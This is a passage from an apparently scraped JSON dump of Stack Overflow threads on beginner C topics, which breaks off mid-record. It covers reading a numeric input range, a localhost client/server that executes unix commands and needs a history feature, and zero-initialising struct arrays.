[{"tags": ["c", "range", "max", "min"], "comments": [{"owner": {"reputation": 1, "user_id": 3975177, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7ODKj.jpg?s=128&g=1", "display_name": "Swordfish", "link": "https://stackoverflow.com/users/3975177/swordfish"}, "edited": false, "score": 0, "creation_date": 1542239057, "post_id": 53310366, "comment_id": 93501652, "body": "&quot;would I be able to somehow simply ask the user to &quot;enter a value for Min&quot;, &quot;enter a value for Max&quot; and &quot;enter the increment value&quot; (or something along those lines)?&quot; Yes. What keeps you from doing just that?"}], "answers": [{"tags": [], "owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "is_accepted": false, "score": 0, "last_activity_date": 1542240155, "creation_date": 1542240155, "answer_id": 53310590, "question_id": 53310366, "link": "https://stackoverflow.com/questions/53310366/c-how-to-ask-the-user-for-a-range-of-a-variable-that-is-both-a-minimum-and-max/53310590#53310590", "title": "C: How to Ask the User for a Range of a Variable (that is both a Minimum and Maximum value) and an Increment Value for that Variable", "body": "<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n    int min = -1;\n    int max = -1;\n    int increment = -1;\n\n    do{\n      printf(\"Enter the POSITIVE min value\\n\");\n      scanf(\"%d\\n\", &amp;min);\n    }while(min &lt; 0);\n\n    do{\n      printf(\"Enter the POSITIVE max value\\n\");\n      scanf(\"%d\\n\", &amp;max);\n    }while(max &lt; 0);\n\n    do{\n      printf(\"Enter the POSITIVE increment value\\n\");\n      scanf(\"%d\\n\", &amp;increment);\n    }while(increment &lt; 0);\n\n    printf(\"%d %d %d\\n\", min, max, increment);\n    return 0;\n}\n</code></pre>\n\n<p>Here is a sample way to get user input, where you only allow positive input.  If you need to allow negative input, there are other ways to trap input errors you should look into.  This doesnt handle if the user enters stupid stuff like ASDF for min depth, if that is ok this should be fine.  if not you need to read all of stdin and parse it, which seems like more trouble than its worth for you at this stage :)  GL with your physics homework</p>\n"}], "owner": {"reputation": 1, "user_id": 10653990, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0d46981cdb95da0768d3f99980a04fcc?s=128&d=identicon&r=PG&f=1", "display_name": "R. Gauthier", "link": "https://stackoverflow.com/users/10653990/r-gauthier"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 43, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1542240155, "creation_date": 1542238581, "question_id": 53310366, "link": "https://stackoverflow.com/questions/53310366/c-how-to-ask-the-user-for-a-range-of-a-variable-that-is-both-a-minimum-and-max", "title": "C: How to Ask the User for a Range of a Variable (that is both a Minimum and Maximum value) and an Increment Value for that Variable", "body": "<p>I am new to coding and have started with C. In the question I am working through, it is asking to develop software that allows the user to study how the total force will vary with water depth for the type of dam presented. (total force of the pressure of water exerted on a dam)</p>\n\n<p>The equation given to use is: F(d)=pg(h/2)[bd+(2\u01a9w(zi)(d-zi))],<br/>\n**[the sigma in the equation has index i=1(bottom of sigma) and finishes at n-1(top of sigma)]<br/>\n**[this equation was determined by using the trapezoidal rule for integration]</p>\n\n<pre><code>Where,\n\nF(d) = the total force for the depth d;\np = the density of water (assumed to be 10^3 kg/m^3);\ng = acceleration due to gravity (9.8 m/s^2);\nb = the width of the channel base;\nd = elevation (in m) of the water above the channel bottom;\nh = d/n; **(I am also confused on what n would be)**\na = is the distance from the edge of the channel base to the bank of the channel;\nb = the width of the channel base;\nD = the depth of the channel;\nzi = z(i-1)+h for i=1,2,...,n-1;\nw(zi) = (2a/D^2)(zi^2)+b\n</code></pre>\n\n<p>It also states... The user will provide the following input: <br/>\n\u2022   dam and channel dimensions (values of a, b, D),<br/> \n\u2022   the range of water depth d (that is both a minimum and maximum value for the depth),<br/>\n\u2022   An increment value for the depth d to for plotting the total force ft(d) (integration is used to find the force ft for each value of the depth d).<br/></p>\n\n<p>So my question is aimed at the last two bullets above. <strong>How would I ask the user to input the range of water depth d and the increment value for d?</strong></p>\n\n<p>With the research that I have done, I believe I could create some kind of sorting function that will run a number of passes on an array (which contains the Min and Max values inputted by the user) and have the lowest number inputted as the minimum value and the largest number inputted as the maximum value. I would also need to make a loop over passes for this method to work. I could be very wrong about this as I am new to programming.</p>\n\n<p>Is there an easier, less complicated way to do this? Like, would I be able to somehow simply ask the user to \"enter a value for Min\", \"enter a value for Max\" and \"enter the increment value\" (or something along those lines)?</p>\n\n<p>Any suggestion will help, thanks in advance!!</p>\n"}, {"tags": ["c", "server", "client"], "comments": [{"owner": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 1, "creation_date": 1542237964, "post_id": 53310177, "comment_id": 93501320, "body": "In your client, <code>for (int a = 0; a &lt; historyCounter; a++){</code> is a problem once <code>historyCounter</code> exceeds 10, which it can do. You guard against this in the first loop (the storage loop), but not against it in the processing loop. You can rectify most of this by simply using <code>historyCounter = min(historyCounter+1, 10);</code>. That would remove the need to check against <code>&lt; 10</code> in the first loop, and fix the second implicitly. There may be other problems, but that one jumped at me so I figured i&#39;d mention it."}, {"owner": {"reputation": 125, "user_id": 3483181, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/GgpoG.jpg?s=128&g=1", "display_name": "DsDude", "link": "https://stackoverflow.com/users/3483181/dsdude"}, "reply_to_user": {"reputation": 58995, "user_id": 1322972, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/puZFr.png?s=128&g=1", "display_name": "WhozCraig", "link": "https://stackoverflow.com/users/1322972/whozcraig"}, "edited": false, "score": 0, "creation_date": 1542239867, "post_id": 53310177, "comment_id": 93501874, "body": "Thanks craig, I appreciate the help on that, that makes sense"}], "answers": [{"tags": [], "owner": {"reputation": 165, "user_id": 10569552, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a19bab13980743df8c0947d5969894d?s=128&d=identicon&r=PG&f=1", "display_name": "anand", "link": "https://stackoverflow.com/users/10569552/anand"}, "is_accepted": false, "score": 0, "last_activity_date": 1542250542, "creation_date": 1542250542, "answer_id": 53311761, "question_id": 53310177, "link": "https://stackoverflow.com/questions/53310177/adding-history-command-to-multiclient-server-program/53311761#53311761", "title": "Adding history command to multiclient server program", "body": "<p>fgets() reads until newline  but also copies that newline  at the end of input buffer. In strcmp() for history command it can fail. Pls check man page of fgets(). </p>\n"}], "owner": {"reputation": 125, "user_id": 3483181, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/GgpoG.jpg?s=128&g=1", "display_name": "DsDude", "link": "https://stackoverflow.com/users/3483181/dsdude"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 32, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1607546032, "creation_date": 1542237309, "last_edit_date": 1607546032, "question_id": 53310177, "link": "https://stackoverflow.com/questions/53310177/adding-history-command-to-multiclient-server-program", "title": "Adding history command to multiclient server program", "body": "<p>I have this client and server program. I'm trying to add a history command where it displays the last 10 commands when you type &quot;history&quot; in the commandline, but I'm having issues with it where it won't display at all, but I'm not sure why it won't work. After I type &quot;history&quot; it won't display anything and I can't type any commands after which makes me have to re-launch the code be able to type unix commands in. This program works by sending unix commands such as &quot;ls&quot; or &quot;date&quot; and it will send the info from the server back to the client. It may be because my code is a little buggy, but it should still work. Any one can point me in the right direction?</p>\n<p>Client:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;arpa/inet.h&gt;\n\n#define BUFFSIZE 2048\n\nchar history[10][50];\nint historyCounter = 0;\n\nchar *encryptedMessage(char command[]){\n    int i = 0;\n\n    while (command[i] != '\\0'){\n        command[i] += 5;\n        i += 1;\n    }\n\n    return command;\n}\n\n\n\nint main(int argc, char *argv[]){\n    /*Created variables for socket, server address, argument size, and a buffer*/\n    int clientSocket, ret, portnum;\n    struct sockaddr_in serverAddr;\n    int received = 0;\n    unsigned int echolen;\n    char buffer[BUFFSIZE];\n\n    /*If there is less than 3 arguments, print out a statement explaining to execute program\n    along witjh server ip and port*/\n    if(argc &lt; 3){\n        fprintf(stderr,&quot;usage %s &lt;server-ip-addr&gt; &lt;server-port&gt;\\n&quot;, argv[0]);\n        exit(0);\n    }\n    /*Convert port number from the commandline using atoi*/\n    portnum = atoi(argv[2]);\n\n    /*Create socket, and check if there is an error in the connection*/\n    clientSocket = socket(AF_INET, SOCK_STREAM, 0);\n    if(clientSocket &lt; 0){\n        printf(&quot;Error in connection.\\n&quot;);\n        exit(1);\n    }\n    printf(&quot;Client Socket is created.\\n&quot;);\n    /*Memset server address*/\n    memset(&amp;serverAddr, '\\0', sizeof(serverAddr));\n    // memset(&amp;buffer, '\\0', sizeof(buffer));\n    // serverAddr.sin_family = AF_INET;\n    // serverAddr.sin_port = htons(PORT);\n    // serverAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);\n\n    // bzero((char *) &amp;serverAddr, sizeof(serverAddr));\n\n    /*Take ip address from commandline and set it into serverAddr*/\n    serverAddr.sin_family = AF_INET;\n    if(!inet_aton(argv[1], &amp;serverAddr.sin_addr)){\n        fprintf(stderr, &quot;Error invalid server IP address\\n&quot;);\n        exit(1);\n    }\n    /*Take the port number and set it in the sin_port for connection*/\n    serverAddr.sin_port = htons(portnum);\n    /*Connect the client to the server, if less than 0, then there is an error in the connection*/\n    ret = connect(clientSocket, (struct sockaddr*)&amp;serverAddr, sizeof(serverAddr));\n    if(ret &lt; 0){\n        printf(&quot;Error in connection.\\n&quot;);\n        exit(1);\n    }\n    printf(&quot;Connected to server.\\n&quot;);\n    /*Initialize argument buffer*/\n    char s[100];\n    /*In the while loop we take the arguments after we connect and put them in stdin, we insert \\0 at the\n    end of s array*/\n    while(1){\n        int _switch = 0;\n        fgets(s, 100, stdin);\n        historyCounter++;\n        //s[strlen(s)-1]='\\0';\n        echolen = strlen(s);\n        if(historyCounter &lt; 10){\n            for(int i = 0; i &lt; historyCounter; i++){\n                strcpy(history[i+1], history[i]);\n            }\n        }\n        strcpy(history[0], s);\n\n        /*  send() from client, if it doesn't equal echolen then show it failed */\n        if(strcmp(s,&quot;history&quot;) == 0){\n            _switch = 1;\n            int a = 0;\n            int b = 0;\n\n            for (int a = 0; a &lt; historyCounter; a++){\n                printf(&quot;%d&quot;, historyCounter);\n                while(history[a][b] != '\\0'){\n                    printf(&quot;%c&quot;, history[a][b]);\n                    b++;\n                }\n                b = 0;\n                printf(&quot;\\n&quot;);\n            }\n            printf(&quot;\\n&quot;);\n\n        }\n\n\n        if(_switch == 0){\n            if (send(clientSocket, s, echolen, 0) != echolen)\n        {\n            printf(&quot;Failed&quot;);\n        }\n\n        if(strcmp(s,&quot;quit&quot;) == 0) //check if exit is typed\n            exit(0);\n        fprintf(stdout, &quot;Message from server: &quot;);\n        //fprintf(stdin, &quot;%s\\n&quot;, s);\n        while (received &lt; echolen)\n        {\n            ssize_t bytes = 0;\n            /* recv() from server, the bytes we receive are from the clientSocket */\n            if ((bytes = recv(clientSocket, buffer, echolen, 0)) &lt; 1)\n            {\n                printf(&quot;Failed to get Information&quot;);\n            }\n            received += bytes;\n            buffer[bytes] = '\\0';\n            /*WE receive the information and print in stdout what's in the buffer*/\n            fprintf(stdout, buffer);\n        }\n        ssize_t bytes = 0;\n        /*Place /0 at end of the buffer*/\n        do {\n            buffer[bytes] = '\\0';\n            printf(&quot;%s\\n&quot;, buffer);\n        } while((bytes = recv(clientSocket, buffer, BUFFSIZE-1, 0))&gt;=BUFFSIZE-1);\n        buffer[bytes] = '\\0';\n        printf(&quot;%s\\n&quot;, buffer);\n        printf(&quot;\\n&quot;);\n        }\n\n        /*Above is essentially printing out the information within the buffer from the recv()*/\n\n    }\n}\n</code></pre>\n<p>Server:</p>\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;netinet/in.h&gt;\n#include &lt;arpa/inet.h&gt;\n\n#define PORT 4444\n#define BUFFSIZE 2048\n#define MAX 2048\n/*Full Credit implementing command argument functions: https://stackoverflow.com/questions/52796610/multiclient-and-server-commandline-argument-issues*/\n/*setup() function take the input bugger and the arguments and tokenizes the arguments into the inputBuffer*/\nvoid setup(char inputBuffer[], char *args[], int *background){\n    const char s[4] = &quot; \\t\\n&quot;;\n    char *token;\n    token = strtok(inputBuffer, s);\n    int i = 0;\n    while(token != NULL){\n        args[i] = token;\n        i++;\n        token = strtok(NULL, s);\n    }\n    args[i] = NULL;\n}\n/*HandleClient() function take the socket, grabs the data from the client from the buffer*/\nvoid HandleClient(int sock){\n    char buffer[BUFFSIZE];\n    int received = -1;\n    char data[MAX];\n    memset(data, 0, MAX);\n    /*recv grabs info from the buffer*/\n    while(1){\n        data[0] = '\\0';\n        if((received = recv(sock, buffer, BUFFSIZE, 0)) &lt; 0){\n            printf(&quot;Error&quot;);\n        }\n\n        buffer[received] = '\\0';\n\n        strcat(data, buffer);\n        if(strcmp(data, &quot;exit&quot;) == 0){\n            exit(0);\n        }\n        /*Put data into an arg array and pipe*/\n        puts(data);\n        char *args[100];\n        setup(data, args, 0);\n        int pipefd[2], length;\n\n        if(pipe(pipefd)){\n            printf(&quot;failed to create pipe&quot;);\n        }\n        /*Fork a child*/\n        pid_t pid = fork();\n        char path[MAX];\n\n        if(pid==0)\n        {\n            close(pipefd[0]); // close the readonly side of the pipe\n            //close(1); // close the original stdout\n            dup2(pipefd[1],1); // duplicate pipfd[1] to stdout\n            dup2(pipefd[1], fileno(stderr));\n            //close(pipefd[0]); // close the readonly side of the pipe\n            close(pipefd[1]); // close the original write side of the pipe\n            printf(&quot;before execvp&quot;);\n            execvp(args[0],args); // finally execute the command\n            // exit(0);\n        }\n        else\n            if(pid&gt;0)\n            {\n                close(pipefd[1]);\n                memset(path,'\\0',MAX);\n                while(length=read(pipefd[0],path,MAX-1)){\n                    //printf(&quot;Data read so far %s\\n&quot;, path);\n                    if(send(sock,path,strlen(path),0) != strlen(path) ){\n                        printf(&quot;Failed&quot;);\n                    }\n                    fflush(NULL);\n                    //printf(&quot;Data sent so far %s\\n&quot;, path);\n                memset(path,0,MAX);\n                }\n                close(pipefd[0]);\n\n                //exit(1); removed so server will not terminate\n            }\n            else\n            {\n                printf(&quot;Error !\\n&quot;);\n                exit(0);//\n            }\n\n    }\n}\n\nchar *decryptedMessage(char command[]){\n    int i = 0;\n\n    while (command[i] != '\\0'){\n        command[i] -= 5;\n        i += 1;\n    }\n\n    return command;\n}\n\n\nint main(){\n    /*Create all the sock, server address, and pid variables*/\n    int sockfd, ret;\n    struct sockaddr_in serverAddr;\n\n    int newSocket;\n    struct sockaddr_in newAddr;\n\n    socklen_t addr_size;\n\n    char buffer[1024];\n    pid_t childpid;\n    /*Create a socket*/\n    sockfd = socket(AF_INET, SOCK_STREAM, 0);\n    if(sockfd &lt; 0){\n        printf(&quot;Error in connection.\\n&quot;);\n        exit(1);\n    }\n    printf(&quot;Server Socket is created.\\n&quot;);\n    /*Memset the serverAddr, and put the ip and port number into the serverAddr structure*/\n    memset(&amp;serverAddr, '\\0', sizeof(serverAddr));\n    serverAddr.sin_family = AF_INET;\n    serverAddr.sin_port = htons(PORT);\n    serverAddr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);\n\n    //printf(&quot;IP address is: %s\\n&quot;, inet_ntoa(client_addr.sin_addr));\n    //printf(&quot;port is: %d\\n&quot;, (int) ntohs(client_addr.sin_port));\n    \n    /*Bind to the port*/\n    ret = bind(sockfd, (struct sockaddr*)&amp;serverAddr, sizeof(serverAddr));\n    if(ret &lt; 0){\n        printf(&quot;Error in binding&quot;);\n        exit(1);\n    }\n    printf(&quot;Bind to port %d\\n&quot;, 4444);\n\n    if(listen(sockfd, 10) == 0){\n        printf(&quot;Listening....\\n&quot;); //Listening to accept connections\n    }else{\n        printf(&quot;Error in binding.\\n&quot;);\n    }\n\n    while(1){\n        newSocket = accept(sockfd, (struct sockaddr*) &amp;newAddr, &amp;addr_size); //accept the socket and server address\n        if(newSocket &lt; 0){\n            exit(1);\n        }\n        printf(&quot;Connection accepted from %s:%d\\n&quot;, inet_ntoa(newAddr.sin_addr), ntohs(newAddr.sin_port));\n\n        //Take the buffer from the server and send it back to the client through the socket\n        if((childpid = fork()) == 0){\n            close(sockfd);\n\n            while(1){\n                recv(newSocket, buffer, 1024, 0); //recv() get the buffer and set the size 1024\n                if(strcmp(buffer, &quot;quit&quot;) == 0){\n                    printf(&quot;Disconnected from %s:%d\\n&quot;, inet_ntoa(newAddr.sin_addr), ntohs(newAddr.sin_port));\n                    break;\n                }else{\n                    printf(&quot;Client: %s\\n&quot;, buffer);\n                    send(newSocket, buffer, strlen(buffer), 0); //sending info back to the client\n                    bzero(buffer, sizeof(buffer));\n                }\n                HandleClient(newSocket);\n            }\n        }\n    }\n\n\n    close(newSocket);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "struct"], "answers": [{"tags": [], "owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "is_accepted": false, "score": 2, "last_activity_date": 1542238986, "last_edit_date": 1542238986, "creation_date": 1542237405, "answer_id": 53310193, "question_id": 53310148, "link": "https://stackoverflow.com/questions/53310148/initialization-array-of-structs-null-vs/53310193#53310193", "title": "Initialization array of structs - {NULL} vs {}", "body": "<p>The first version is immediately illegal. C language does not support <code>{}</code> initializers.</p>\n\n<p>The second version is generally illegal, even though it might \"compile\" in some implementations. In this case, in accordance with the rules of aggregate initialization your <code>NULL</code> will act as an initializer for <code>someObjects[0].type1</code> field. This field has type <code>int</code>. However, even though in many implementations you might be able to successfully initialize <code>int</code> objects with <code>NULL</code>, in general case it is not possible. <code>NULL</code> is intended to be used in pointer context, not in integer context.</p>\n\n<p>If you want to zero-initialize your entire array, the proper way to do it is</p>\n\n<pre><code>MyStruct someObjects[5] = { 0 };\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "is_accepted": false, "score": 2, "last_activity_date": 1542238296, "last_edit_date": 1542238296, "creation_date": 1542237432, "answer_id": 53310199, "question_id": 53310148, "link": "https://stackoverflow.com/questions/53310148/initialization-array-of-structs-null-vs/53310199#53310199", "title": "Initialization array of structs - {NULL} vs {}", "body": "<p><code>MyStruct someObjects[5] = {};</code> isn't conformant C and \nwhether <code>MyStruct someObjects[5] = {NULL};</code> is conformant C is implementation defined*.</p>\n\n<p>You should initialize it with <code>MyStruct someObjects[5] = {0};</code>. <code>{0}</code> is the way to default/zero-initialize any array, aggregate object or compound literal in C.</p>\n\n<p><code>{0}</code> works for default/zero-initialization because <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.7.9p19\" rel=\"nofollow noreferrer\">6.7.9p19</a> and <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.7.9p20\" rel=\"nofollow noreferrer\">6.7.9p20</a> will cause the <code>0</code> to recursively target the first primitive object, because every primitive data object in C is either numerical or a pointer and therefore initialiazable with <code>0</code> and finally because <a href=\"http://port70.net/~nsz/c/c11/n1570.html#6.7.9p21\" rel=\"nofollow noreferrer\">6.7.9p21</a> says that:</p>\n\n<blockquote>\n  <p>If there are fewer initializers in a brace-enclosed list than there\n  are elements or members of an aggregate, or fewer characters in a\n  string literal used to initialize an array of known size than there\n  are elements in the array, the remainder of the aggregate shall be\n  initialized implicitly the same as objects that have static storage\n  duration.</p>\n</blockquote>\n\n<hr>\n\n<p>*<code>NULL</code> could be defined as <code>0</code> in which case <code>{NULL}</code> is OK, or it could just as well be defined <code>(void*)0</code> in which case <code>{NULL}</code>'s not OK in your case because recursively, you're array's first primitive object (<code>int type1;</code>) is not a pointer initalizable from <code>(void*)</code> or even a pointer.</p>\n"}, {"comments": [{"owner": {"reputation": 694, "user_id": 7484554, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ad45f075aa4d69cbd552b671a32bf3ed?s=128&d=identicon&r=PG&f=1", "display_name": "Super Mario", "link": "https://stackoverflow.com/users/7484554/super-mario"}, "edited": false, "score": 0, "creation_date": 1542285129, "post_id": 53310220, "comment_id": 93519096, "body": "Is it the same in gcc to write { 0 } and { } ?"}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "reply_to_user": {"reputation": 694, "user_id": 7484554, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ad45f075aa4d69cbd552b671a32bf3ed?s=128&d=identicon&r=PG&f=1", "display_name": "Super Mario", "link": "https://stackoverflow.com/users/7484554/super-mario"}, "edited": false, "score": 1, "creation_date": 1542319398, "post_id": 53310220, "comment_id": 93537486, "body": "@SuperMario: Not in all cases. Another gcc extension is that it permits empty structures. So <code>struct empty { } obj = { };</code> is valid in GNU C, but <code>struct empty { } obj = { 0 };</code> gets at least a warning. Apart from that, as far as I know, they should be equivalent."}], "tags": [], "owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "is_accepted": true, "score": 2, "last_activity_date": 1542237562, "creation_date": 1542237562, "answer_id": 53310220, "question_id": 53310148, "link": "https://stackoverflow.com/questions/53310148/initialization-array-of-structs-null-vs/53310220#53310220", "title": "Initialization array of structs - {NULL} vs {}", "body": "<p>The difference is that the first is illegal in standard C, and the second may or may not be.</p>\n\n<p><code>{}</code> in an initializer is not legal in C; you need at least one element between the <code>{</code> and <code>}</code>. (Some compilers might permit it as an extension; I think gcc does.)</p>\n\n<p>A common idiom is</p>\n\n<pre><code>some_type blah[] = { 0 };\n</code></pre>\n\n<p>The initial element is initialized to <code>0</code> (which could be a null pointer, floating-point zero, a null character, etc.), and the remaining unspecified elements are initialized to zero for the appropriate type.</p>\n\n<p>With the <code>{NULL}</code> initializer you're trying to initialize <code>someObjects[0].type1</code>, an <code>int</code> to <code>NULL</code>. The <code>NULL</code> macro is intended to be used as a null pointer constant. It <em>may or may not</em> be defined as a constant <code>0</code>, so the legality of your initializer is implementation-specific.</p>\n\n<p>Just write</p>\n\n<pre><code>MyStruct someObjects[5] = {0};\n</code></pre>\n"}], "owner": {"reputation": 694, "user_id": 7484554, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ad45f075aa4d69cbd552b671a32bf3ed?s=128&d=identicon&r=PG&f=1", "display_name": "Super Mario", "link": "https://stackoverflow.com/users/7484554/super-mario"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1472, "favorite_count": 0, "accepted_answer_id": 53310220, "answer_count": 3, "score": 1, "last_activity_date": 1542238986, "creation_date": 1542237136, "question_id": 53310148, "link": "https://stackoverflow.com/questions/53310148/initialization-array-of-structs-null-vs", "title": "Initialization array of structs - {NULL} vs {}", "body": "<p>If I have this struct:</p>\n\n<pre><code>typedef struct MyStruct\n{\n    int type1;\n    char *type2;\n    char type3[CHARS_AMOUNT];\n} MyStruct;\n</code></pre>\n\n<p>What would be the difference between following initialization:</p>\n\n<p>option 1:</p>\n\n<pre><code>int main(int argc, char *argv[])\n{\n    MyStruct someObjects[5] = {};\n}\n</code></pre>\n\n<p>option 2:</p>\n\n<pre><code>int main(int argc, char *argv[])\n{\n    MyStruct someObjects[5] = {NULL};\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "edited": false, "score": 0, "creation_date": 1542237073, "post_id": 53310119, "comment_id": 93501042, "body": "Please edit your question to include some sample input text"}, {"owner": {"reputation": 11, "user_id": 6135803, "user_type": "registered", "profile_image": "https://graph.facebook.com/1085348714820920/picture?type=large", "display_name": "Jorge Proen&#231;a", "link": "https://stackoverflow.com/users/6135803/jorge-proen%c3%a7a"}, "reply_to_user": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "edited": false, "score": 0, "creation_date": 1542237479, "post_id": 53310119, "comment_id": 93501179, "body": "edited thanks, it has a white line between problems"}, {"owner": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "edited": false, "score": 0, "creation_date": 1542237512, "post_id": 53310119, "comment_id": 93501188, "body": "So that first line for a type <code>A</code> process, would be: <code>5 5 A 1</code> ?"}, {"owner": {"reputation": 11, "user_id": 6135803, "user_type": "registered", "profile_image": "https://graph.facebook.com/1085348714820920/picture?type=large", "display_name": "Jorge Proen&#231;a", "link": "https://stackoverflow.com/users/6135803/jorge-proen%c3%a7a"}, "reply_to_user": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "edited": false, "score": 0, "creation_date": 1542237656, "post_id": 53310119, "comment_id": 93501228, "body": "yes the 5 5 is the matrix size, a or b is the type of problem ande the last number is 1 for a or 2plus for b"}, {"owner": {"reputation": 11, "user_id": 6135803, "user_type": "registered", "profile_image": "https://graph.facebook.com/1085348714820920/picture?type=large", "display_name": "Jorge Proen&#231;a", "link": "https://stackoverflow.com/users/6135803/jorge-proen%c3%a7a"}, "reply_to_user": {"reputation": 12260, "user_id": 1730895, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e6abb0b52473d614852289b49ccf3c3c?s=128&d=identicon&r=PG", "display_name": "Kingsley", "link": "https://stackoverflow.com/users/1730895/kingsley"}, "edited": false, "score": 0, "creation_date": 1542237678, "post_id": 53310119, "comment_id": 93501234, "body": "if its b, after the first line theres mor than one point"}, {"owner": {"reputation": 656, "user_id": 9592917, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7fe6504c31f4954495f952699592361a?s=128&d=identicon&r=PG&f=1", "display_name": "Bwebb", "link": "https://stackoverflow.com/users/9592917/bwebb"}, "edited": false, "score": 0, "creation_date": 1542237698, "post_id": 53310119, "comment_id": 93501242, "body": "is there something unique int eh line that describes hte problem (like an = sign) that will always be there and no where else?  you could use strstr(line, &quot;=&quot;) to search the line for that unique value and no that you are at the next problem."}, {"owner": {"reputation": 11, "user_id": 6135803, "user_type": "registered", "profile_image": "https://graph.facebook.com/1085348714820920/picture?type=large", "display_name": "Jorge Proen&#231;a", "link": "https://stackoverflow.com/users/6135803/jorge-proen%c3%a7a"}, "edited": false, "score": 0, "creation_date": 1542237817, "post_id": 53310119, "comment_id": 93501271, "body": "but how do i know theres more than one problem? cause theres some files with just one and some with more."}, {"owner": {"reputation": 11, "user_id": 6135803, "user_type": "registered", "profile_image": "https://graph.facebook.com/1085348714820920/picture?type=large", "display_name": "Jorge Proen&#231;a", "link": "https://stackoverflow.com/users/6135803/jorge-proen%c3%a7a"}, "edited": false, "score": 0, "creation_date": 1542237999, "post_id": 53310119, "comment_id": 93501325, "body": "i think i should use while(fgtc != Eof) or something but i dont know"}, {"owner": {"reputation": 679, "user_id": 3264657, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/20c5379214923e99c21443dd4d3351f1?s=128&d=identicon&r=PG&f=1", "display_name": "Graph Theory", "link": "https://stackoverflow.com/users/3264657/graph-theory"}, "edited": false, "score": 0, "creation_date": 1542239011, "post_id": 53310119, "comment_id": 93501637, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/3501338/c-read-file-line-by-line\">C read file line by line</a>"}, {"owner": {"reputation": 3887, "user_id": 7914637, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-x_BhuHcC8Ww/AAAAAAAAAAI/AAAAAAAAABg/hiPWIjRXbhI/photo.jpg?sz=128", "display_name": "Alexander", "link": "https://stackoverflow.com/users/7914637/alexander"}, "edited": false, "score": 0, "creation_date": 1542249755, "post_id": 53310119, "comment_id": 93504124, "body": 